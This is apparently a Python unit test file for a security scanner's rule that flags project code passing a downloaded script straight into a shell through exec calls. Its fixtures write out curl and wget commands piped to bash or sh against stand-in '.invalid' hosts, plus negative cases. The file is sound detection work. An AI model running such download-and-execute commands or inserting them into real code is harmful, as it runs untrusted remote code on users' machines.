"""A project's own code that runs a download piped into a shell (SC-PIPE-SHELL;
analyst gap: curl in first-party code).

A bin script with `execSync("curl -s https://… | bash")` passed a project
scan: no rule reads a constant command (T-CMD needs tainted input), while
the registry's import-time test catches the same line in a package. Now a
line of first-party JavaScript or Python that hands a download piped into a
shell to an exec call is SC-PIPE-SHELL (MAJOR), by the same line test
(core._runs_download_through_shell). A dependency's code gets the
import-time test instead (SC-IMPORT-RISK, with --deps), so one line is one
finding. Help text showing the command, a comment, and a download followed
by a separate shell command are not it.

The npm engine's twin: js/test/review-pipe-shell.test.js (and
tests/architecture/test_js_parity.py, test_review_dashboard_parity.py).
Payloads are inert text: hosts are .invalid.
"""
import json
import os
import shutil
import tempfile
import unittest

from lazaret.scanner import core

CURL_JS = 'const { execSync } = require("child_process");\nexecSync("curl -s https://collector.invalid/x | bash");\n'
MSG = "Code runs a downloaded script through a shell."


def found(text, lang="js", dep=False):
    return [(i["rule"], i["sev"], i["line"], i["msg"]) for i in core.scan_file("x." + lang, text, lang, dep=dep)
            if i["rule"] in ("SC-PIPE-SHELL", "SC-IMPORT-RISK")]


class PipeShellTests(unittest.TestCase):
    def test_first_party_code(self):
        cases = [
            ("js", CURL_JS, 2),
            ("js", "cp.exec(`wget -qO- ${url} | sudo sh`, done);\n", 1),
            ("py", "import subprocess\nsubprocess.run('curl -fsSL https://files.invalid/i.sh | sh', shell=True)\n", 2),
            ("py", "os.system(\"wget -qO- https://files.invalid/i.sh|bash\")\n", 1),
            ("js", "spawn('sh', ['-c', 'curl -s https://files.invalid/x | zsh']);\n", 1),
        ]
        for lang, text, line in cases:
            with self.subTest(text=text):
                self.assertEqual(found(text, lang), [("SC-PIPE-SHELL", "MAJOR", line, MSG)])

    def test_not_a_download_run_through_a_shell(self):
        for lang, text in [
            ("js", "console.log('Install with: curl -fsSL https://sh.invalid/i.sh | sh');\n"),   # help text
            ("js", "// execSync('curl https://files.invalid/x | sh')\n"),
            ("py", "# os.system('curl https://files.invalid/x | sh')\n"),
            ("js", "execSync('curl -o x.tgz https://files.invalid/x.tgz; sh build.sh');\n"),       # a separate command
            ("js", "execSync('curl -s https://files.invalid/x | tee log');\n"),
            ("py", "run(['curl', '-o', 'x', url])\n"),
        ]:
            with self.subTest(text=text):
                self.assertEqual(found(text, lang), [])

    def test_a_dependency_gets_the_import_time_test_instead(self):
        self.assertEqual(found(CURL_JS, dep=True), [])
        root = tempfile.mkdtemp(prefix="lz-pipe-")
        self.addCleanup(shutil.rmtree, root, True)
        for rel, text in {"bin/helper.js": CURL_JS, "node_modules/p/index.js": CURL_JS,
                          "node_modules/p/package.json": json.dumps({"name": "p", "version": "1.0.0"}),
                          "package.json": json.dumps({"name": "app", "version": "1.0.0",
                                                      "bin": {"helpful-cli": "./bin/helper.js"}})}.items():
            path = os.path.join(root, *rel.split("/"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
        res = core.scan_project(root, include_deps=True)
        self.assertEqual(sorted((i["rule"], i["file"].replace(os.sep, "/"), i["line"]) for i in res["issues"]
                                if i["rule"] in ("SC-PIPE-SHELL", "SC-IMPORT-RISK")),
                         [("SC-IMPORT-RISK", "node_modules/p/index.js", 2), ("SC-PIPE-SHELL", "bin/helper.js", 2)])
        self.assertFalse(res["pass"])

    def test_never_suppressed(self):
        self.assertEqual(found('execSync("curl -s https://files.invalid/x | bash"); // nosec\n'),
                         [("SC-PIPE-SHELL", "MAJOR", 1, MSG)])


if __name__ == "__main__":
    unittest.main()
